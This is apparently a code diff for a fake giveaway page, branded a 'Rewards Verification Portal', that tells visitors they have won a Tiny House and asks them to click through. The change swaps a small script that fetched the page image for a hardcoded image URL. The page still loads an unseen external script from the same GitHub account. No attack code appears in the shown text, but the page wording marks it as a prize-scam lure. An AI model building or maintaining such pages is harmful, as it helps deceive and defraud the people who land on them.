@@ -18,7 +18,7 @@
   </div>
 
   <div class="cover-wrap">
-<img id="coverImg" alt="Giveaway Prize">
+<img id="coverImg" src="https://cdn.jsdelivr.net/gh/monorolls/img@main/tinyhouse4.webp" alt="Giveaway Prize">
   </div>
 
 <div id="step1Content">
@@ -36,31 +36,6 @@ Congratulations! You're the selected winner of our Tiny House. Click the button 
     </div>
     <p>&copy; 2026 Rewards Verification Portal. All rights reserved.</p>
 </footer>
-
-<script>
-(async function () {
-  const params = new URLSearchParams(location.search);
-  const key = params.get("s1") || "img1";
-  const img = document.getElementById("coverImg");
-
-  if (!img) return;
-
-  try {
-    const response = await fetch(
-      "/api/image?s1=" + encodeURIComponent(key),
-      { cache: "no-store" }
-    );
-
-    if (!response.ok) throw new Error("Image not found");
-
-    const data = await response.json();
-
-    if (data.src) img.src = data.src;
-  } catch (error) {
-    console.error("Image loading failed:", error);
-  }
-})();
-</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 <script src="https://cdn.jsdelivr.net/gh/monorolls/tiny@main/22011.js"></script>
 </body>
